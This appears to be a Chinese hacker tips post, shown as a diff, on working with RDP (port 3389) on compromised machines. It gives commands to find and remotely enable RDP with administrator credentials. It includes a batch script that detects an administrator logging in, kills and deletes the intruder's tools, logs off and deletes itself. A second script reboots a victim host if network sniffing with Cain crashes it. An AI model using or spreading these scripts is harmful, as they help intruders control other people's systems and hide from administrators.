@@ -1,0 +1,66 @@
+3389的一些技巧
+终端, 3389, 渗透
+收集了一些很实用的脚本，渗透基本上都会用的到：
+用win命令查找3389的port（包括修改后的）：
+C:\>tasklist /svc |find “TermService”
+svchost.exe 1300 TermService
+C:\>netstat -ano |find “1300″
+TCP 0.0.0.0:61321 0.0.0.0:0 LISTENING 1300
+TCP 210.72.225.74:61321 123.114.166.67:1697 ESTABLISHED 1300
+用win命令开3389:
+wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 1
+开远程：WMIC /node:”远程机器名” /user:”administrator” /password:”lcx” RDTOGGLE WHERE ServerName=’远程机器名’ call
+监视3389登录并删除、注销的脚本：
+主要用于在登陆肉鸡终端的时候，放哨用的。一旦有人连接终端端口（默认端口3389），就发声报警，并对对方是否登陆进行监控。
+如果有人登陆终端成功，就自动把指定目录的工具（exe后缀的）循环进行“结束 程序进程”操作，整目录进行删除，然后注销会话并删除自身（不留任何文件），防止工具被管理员偷了
+需要根据环境修改的参数如下：
+1.终端端口（本程序为3389）
+2.FC的判断结果，需要根据肉鸡语言决定（本程序针对EN 2K3版本） 判断字符串为 FC对比无异同的结果取单词 differences
++++++++++++++++++++++++++++++++++++++++++++++++++++
+c:\>echo a>1
+c:\>echo a>2
+c:\>fc /b 1 2
+Comparing files 1 and 2
+FC: no differences encountered
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+%temp%\down 此目录是用来放要运行的工具的，EXE后缀的程序，当终端有别人登录时会被程序自动结束进程（所有EXE后缀的文件循环一遍）
+以下是bat脚本：
+@echo off
+rem program by NetPatch
+netstat -an|find “:3389″>%temp%\port_one.log
+quser>%temp%\check_one.log
+:begin
+choice /C UM /T 5 /D U
+netstat -an|find “:3389″>%temp%\port_two.log
+fc /b %temp%\port_one.log %temp%\port_two.log|find “differences”&&goto begin
+echo &echo &echo &echo &echo
+choice /C UM /T 3 /D U
+echo &echo &echo &echo &echo
+rem [^G Sound warning]
+:check
+quser>%temp%\check_two.log
+fc /b %temp%\check_one.log %temp%\check_two.log|find “differences”&&goto check
+for /f %%k in (‘dir /b /a-d %temp%\down\*.exe’) do taskkill /f /im %%k
+echo Y|rmdir %temp%\down /s
+rem down [Put Tools]
+del %temp%\*.log
+logoff
+del %0
+防止cain挂掉网络
+很多朋友在嗅探的时候肉猪一不小心就挂了.那个后悔啊…..
+当然 你要选择尽量少的服务来嗅.比如你要嗅目标的1433及80.那你嗅其他的就没用罗.
+这样会大大的减少当机的可能性.如果看到丢包率超过10%就要注意啦. 赶紧停掉,看看那里没设置好吧.
+如果还是不小心挂了呢.
+没事.这里为您准备了一个BAT 在开嗅的时候运行它就行了哦.
+======start=========
+:ping
+choice /C YN /T 120 /D Y
+ping g.cn
+IF ERRORLEVEL 1 GOTO reboot
+IF ERRORLEVEL 0 GOTO ping
+:reboot
+shutdown /r /t 0
+======end=========
+这里的g.cn你可以设置为网关的IP或你的IP
+如果能ping通的话就继续ping 如果不通的话就认为当机了 (当然，你要事先测试下是否原先可ping，或者改为丢包也挺不错)
+然后就重启了，不过用重启是很容易被发现的，最好或自己写一些语句，像结束cain等，也可以调用上一个脚本，自由发挥 。 
